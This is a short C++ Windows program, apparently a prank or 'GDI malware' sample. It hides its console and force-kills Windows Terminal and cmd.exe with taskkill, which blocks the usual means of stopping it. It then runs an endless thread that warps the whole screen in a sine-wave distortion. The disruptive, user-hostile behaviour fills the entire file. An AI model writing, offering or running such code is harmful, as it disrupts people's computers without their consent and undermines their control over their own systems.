#include <windows.h>
#include <ctime>

DWORD WINAPI fastwave(LPVOID lpvd) { //credits to pankoza2-pl for slow sines, but i recoded it to FAST!
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	HDC hdcMem = CreateCompatibleDC(desk);
	HBITMAP hbmMem = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(hdcMem, hbmMem);
	double angle = 0;
	while (1) {
		BitBlt(hdcMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sh; i++) {
			int offset = static_cast<int>(sin(angle + i * 0.05) * 10);
			BitBlt(desk, 0, i, sw, 1, hdcMem, offset, i, SRCCOPY);
		}
		angle += 0.5;
	}
	DeleteObject(hbmMem);
	DeleteDC(hdcMem);
	ReleaseDC(0, desk);
	return 0;
}
int main(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	AllocConsole();
	FreeConsole();   // console detach

	ShellExecuteA(NULL, NULL, "taskkill", "/f /im windowsterminal.exe", NULL, SW_SHOWDEFAULT);
	ShellExecuteA(NULL, NULL, "taskkill", "/f /im cmd.exe", NULL, SW_SHOWDEFAULT);
	HANDLE waeform = CreateThread(0, 0, fastwave, 0, 0, 0);
	Sleep(-1);
}
